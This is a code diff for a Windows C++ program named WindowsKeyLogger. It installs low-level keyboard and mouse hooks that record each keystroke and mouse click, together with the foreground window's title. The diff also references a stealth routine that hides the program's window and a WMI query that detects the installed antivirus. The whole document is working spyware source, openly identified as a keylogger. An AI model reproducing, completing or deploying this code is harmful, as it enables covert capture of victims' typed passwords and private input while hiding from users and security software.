@@ -21,6 +21,120 @@
 HHOOK hookKeyboard;
 HHOOK hookMouse;
 
+LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
+{
+  PKBDLLHOOKSTRUCT 	content;
+  char 			tmp[0xFF] = {0};
+  std::string 		str;
+  DWORD 		msg;
+  bool			shift;
+  bool			capslock;
+  short			value;
+  char			windowTitle[512];
+  HWND			windowForeground;
+
+  windowForeground = GetForegroundWindow();
+  GetWindowText(windowForeground, windowTitle, 512);
+  shift = false;
+  capslock = false;
+  if (GetAsyncKeyState(VK_SHIFT))
+    shift = true;
+  value = GetKeyState(VK_CAPITAL);
+  if ((value & 1) == 1)
+    capslock = true;
+  else
+    capslock = false;
+  msg = 1;
+  if ((code == HC_ACTION) && wp == WM_SYSKEYUP || wp == WM_KEYUP)
+  {
+    content = reinterpret_cast<PKBDLLHOOKSTRUCT >(lp);
+    if (content->vkCode == VK_SHIFT)
+      shift = false;
+  }
+  if ((code == HC_ACTION) && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
+  {
+    content = reinterpret_cast<PKBDLLHOOKSTRUCT>(lp);
+    msg += (content->scanCode << 16);
+    msg += (content->flags << 24);
+    GetKeyNameText(msg, tmp, 0xFF);
+    str = static_cast<std::string>(tmp);
+    if (str.length() <= 1)
+    {
+      if ((shift == true) ^ (capslock == true))
+      {
+	try
+	{
+	  str = WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
+	}
+	catch (std::out_of_range const &)
+	{
+	  str = toupper(str[0]);
+	}
+      }
+      else
+	str = tolower(str[0]);
+      std::cout << str << " - " << windowTitle << std::endl;
+    }
+    else
+    {
+      try
+      {
+	str = WindowsKeyLogger::keys.at(content->vkCode);
+	std::cout << str << " - " << windowTitle << std::endl;
+      }
+      catch (std::out_of_range const &)
+      {
+	std::cout << "NOT FOUND";
+      }
+    }
+  }
+  return CallNextHookEx(hookKeyboard, code, wp, lp);
+}
+
+LRESULT CALLBACK handleMouse(int code, WPARAM wp, LPARAM lp)
+{
+  MOUSEHOOKSTRUCT 	*mouseStruct;
+  char			windowTitle[512];
+  HWND			windowForeground;
+  short			delta;
+
+  windowForeground = GetForegroundWindow();
+  GetWindowText(windowForeground, windowTitle, 512);
+  if (code == HC_ACTION)
+  {
+    mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lp);
+    switch (wp)
+    {
+      case (WM_LBUTTONDOWN):
+	std::cout << "Left Mouse Button pressed - " << windowTitle << " - X: " << mouseStruct->pt.x << " Y: " << mouseStruct->pt.y << std::endl;
+	break;
+      case (WM_MBUTTONDOWN):
+	std::cout << "Middle mouse button pressed - " << windowTitle << " - X: " << mouseStruct->pt.x << " Y: " << mouseStruct->pt.y << std::endl;
+	break;
+      case (WM_RBUTTONDOWN):
+	std::cout << "Right mouse button pressed - " << windowTitle << " - X: " << mouseStruct->pt.x << " Y: " << mouseStruct->pt.y << std::endl;
+	break;
+      case (WM_MOUSEHWHEEL):
+	delta = GET_WHEEL_DELTA_WPARAM(wp);
+	if (delta > 0)
+	{
+	  std::cout << "Mouse wheel scrolled up - " << windowTitle << " - X: "
+		    << mouseStruct->pt.x << " Y: " << mouseStruct->pt.y
+		    << std::endl;
+	  break;
+	}
+	else
+	{
+	  std::cout << "Mouse wheel scrolled down - " << windowTitle << " - X: " << mouseStruct->pt.x << " Y: " << mouseStruct->pt.y << std::endl;
+	  break;
+	}
+      default:
+	break;
+    }
+  }
+  return CallNextHookEx(hookMouse, code, wp, lp);
+}
+
 WindowsKeyLogger::WindowsKeyLogger()
 {
   this->capslock = false;
@@ -40,7 +154,7 @@ void WindowsKeyLogger::stealth()
   ShowWindow(stealth, 0);
 }
 
-bool WindowsKeyLogger::check_upper()
+bool WindowsKeyLogger::checkUpper()
 {
   if (this->shift && this->capslock)
     return (false);
@@ -127,7 +241,7 @@ void WindowsKeyLogger::getAntiVirus()
     return ;
   }
 
-  hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, static_cast<LPVOID *>(&locator));
+  hres = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER, IID_IWbemLocator, reinterpret_cast<LPVOID *>(&locator));
   if (FAILED(hres))
   {
     std::cerr << "Fail to to create IWbemLocator object" << std::endl;
@@ -173,89 +287,4 @@ void WindowsKeyLogger::getAntiVirus()
   locator->Release();
   pEnumerator->Release();
   CoUninitialize();
-}
-
-LRESULT CALLBACK 	handleKeyboard(int code, WPARAM wp, LPARAM lp)
-{
-  PKBDLLHOOKSTRUCT 	content;
-  char 			tmp[0xFF] = {0};
-  std::string 		str;
-  DWORD 		msg;
-  bool			shift;
-  bool			capslock;
-  short			value;
-  char			windowTitle[512];
-  HWND			windowForeground;
-
-  windowForeground = GetForegroundWindow();
-  GetWindowText(windowForeground, windowTitle, 512);
-  shift = false;
-  if (GetAsyncKeyState(VK_SHIFT))
-    shift = true;
-  value = GetKeyState(VK_CAPITAL);
-  if ((value & 1) == 1)
-    capslock = true;
-  else
-    capslock = false;
-  msg = 1;
-  if ((code == HC_ACTION) && wp == WM_SYSKEYUP || wp == WM_KEYUP)
-  {
-    content = reinterpret_cast<PKBDLLHOOKSTRUCT >(lp);
-    if (content->vkCode == VK_SHIFT)
-      shift = false;
-  }
-  if ((code == HC_ACTION) && (wp == WM_KEYDOWN || wp == WM_SYSKEYDOWN))
-  {
-    content = reinterpret_cast<PKBDLLHOOKSTRUCT>(lp);
-    msg += (content->scanCode << 16);
-    msg += (content->flags << 24);
-    GetKeyNameText(msg, tmp, 0xFF);
-    str = static_cast<std::string>(tmp);
-    if (str.length() <= 1)
-    {
-      if ((shift == true) ^ (capslock == true))
-      {
-	try
-	{
-	  str = WindowsKeyLogger::correlingTable.at(static_cast<int>(str[0]));
-	}
-	catch (std::out_of_range const &)
-	{
-	  str = toupper(str[0]);
-	}
-      }
-      else
-	str = tolower(str[0]);
-      std::cout << str << " - " << windowTitle << std::endl;
-    }
-    else
-    {
-      try
-      {
-	str = WindowsKeyLogger::keys.at(content->vkCode);
-	std::cout << str << " - " << windowTitle << std::endl;
-      }
-      catch (std::out_of_range const &)
-      {
-	std::cout << "NOT FOUND";
-      }
-    }
-  }
-  return CallNextHookEx(hookKeyboard, code, wp, lp);
-}
-
-LRESULT CALLBACK handleMouse(int code, WPARAM wp, LPARAM lp)
-{
-  MOUSEHOOKSTRUCT 	*mouseStruct;
-  char			windowTitle[512];
-  HWND			windowForeground;
-
-  windowForeground = GetForegroundWindow();
-  GetWindowText(windowForeground, windowTitle, 512);
-  if (code == HC_ACTION)
-  {
-    mouseStruct = reinterpret_cast<MOUSEHOOKSTRUCT *>(lp);
-
-  }
-  return CallNextHookEx(hookMouse, code, wp, lp);
 }
